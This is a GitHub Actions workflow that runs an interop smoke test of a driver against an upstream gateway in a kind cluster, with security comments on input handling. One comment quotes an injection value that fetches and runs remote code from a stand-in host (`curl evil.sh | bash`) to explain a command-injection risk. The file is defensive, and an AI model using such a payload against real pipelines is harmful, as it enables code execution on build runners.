name: interop-smoke

# Reusable. Proves a real upstream gateway accepts this driver.
#
# SECURITY: this workflow holds NO secrets. It is called from branch-checks,
# which runs on pull_request and is therefore reachable from forks. Because
# there is nothing here to exfiltrate, its safety does not depend on GitHub's
# fork rules holding. Do not add secrets to this file.
#
# The other half of the threat model: `inputs.gateway_ref` is untrusted (it
# is attacker-controlled on a `workflow_dispatch` from anyone with write
# access, and indirectly shaped by whatever a `workflow_call` caller passes
# through). NEVER interpolate `${{ inputs.* }}` directly into a `run:`
# block — the expression is substituted into the script's *text* before bash
# ever parses it, so a value like `x"; curl evil.sh | bash #` becomes
# literal shell code on the runner (CWE-78). That would let a malicious
# input make this job report `success` no matter what the assertions find,
# which defeats the point of a required gate even though nothing here is
# secret. Pass such inputs through `env:` (data, not code) and validate
# their shape before use.
on:
  workflow_call:
    inputs:
      gateway_ref:
        description: "Upstream gateway ref: 'latest' or a vN.N.NN tag"
        required: true
        type: string
    outputs:
      tested_gateway_tag:
        description: "Gateway tag this run actually resolved and tested against"
        value: ${{ jobs.smoke.outputs.tested_gateway_tag }}
  workflow_dispatch:
    inputs:
      gateway_ref:
        description: "Upstream gateway ref: 'latest' or a vN.N.NN tag"
        required: false
        default: ""
        type: string

permissions:
  contents: read

jobs:
  smoke:
    name: driver works against upstream gateway
    runs-on: ubuntu-latest
    timeout-minutes: 25
    outputs:
      tested_gateway_tag: ${{ steps.refs.outputs.tag }}
    steps:
      - name: Checkout
        uses: actions/checkout@v7

      - name: Override GATEWAY_REF when one was supplied
        if: inputs.gateway_ref != ''
        env:
          GATEWAY_REF_INPUT: ${{ inputs.gateway_ref }}
        run: |
          # GATEWAY_REF_INPUT arrives via env, not interpolation, so it is
          # data to bash rather than code (see the SECURITY note above).
          # Still validate its shape: the resolver only accepts 'latest' or
          # vN.N.NN, and an unvalidated value could otherwise carry sed
          # metacharacters that corrupt the knob file even without malice.
          if [[ "$GATEWAY_REF_INPUT" != "latest" && ! "$GATEWAY_REF_INPUT" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "error: gateway_ref must be 'latest' or vN.N.NN, got: $GATEWAY_REF_INPUT" >&2
            exit 1
          fi
          sed -i "s/^GATEWAY_REF=.*/GATEWAY_REF=${GATEWAY_REF_INPUT}/" .github/upstream-compat.env
          cat .github/upstream-compat.env

      - name: Resolve upstream references
        id: refs
        # shell: bash is NOT decorative. GitHub's default run: shell is
        # `bash -e {0}` — pipefail is only added when a step declares
        # `shell: bash` explicitly. Without it, `foo | tee x` reports tee's
        # exit status (always 0), so a `die()` inside resolve-upstream-refs.sh
        # would be silently swallowed instead of failing the job. (interop-
        # smoke.sh does independently guard its required env vars, so this
        # path fails safe today — but late, after kind setup, with a
        # confusing message. Fixing it here for a clean, early failure.)
        shell: bash
        run: |
          ./scripts/resolve-upstream-refs.sh | tee -a "$GITHUB_ENV"
          # Publish the resolved tag so callers can state WHICH gateway was
          # tested. `latest` resolves at RUN TIME, so a sync job and a later
          # smoke on its PR can legitimately land on different upstream
          # releases if one ships in between.
          grep "^GATEWAY_TAG=" "$GITHUB_ENV" | tail -1 | sed "s/^GATEWAY_TAG=/tag=/" >> "$GITHUB_OUTPUT"

      - name: Install uv
        uses: astral-sh/setup-uv@v7
        with:
          # This is a Rust repo: there is no uv.lock or requirements*.txt
          # for setup-uv to key a cache on, so the cache would never be
          # invalidated. We install exactly one pinned package
          # (openshell==<resolved version>), so caching buys nothing.
          enable-cache: false

      - name: Create kind cluster
        uses: helm/kind-action@v1
        with:
          cluster_name: interop

      - name: Build the driver image
        run: docker build -f deploy/Dockerfile -t openshell-driver-kyma:smoke .

      - name: Load the driver image into kind
        run: kind load docker-image openshell-driver-kyma:smoke --name interop

      - name: Run the interop smoke
        env:
          DRIVER_IMAGE: openshell-driver-kyma:smoke
        run: ./scripts/interop-smoke.sh

      - name: Tear down
        if: always()
        run: kind delete cluster --name interop || true
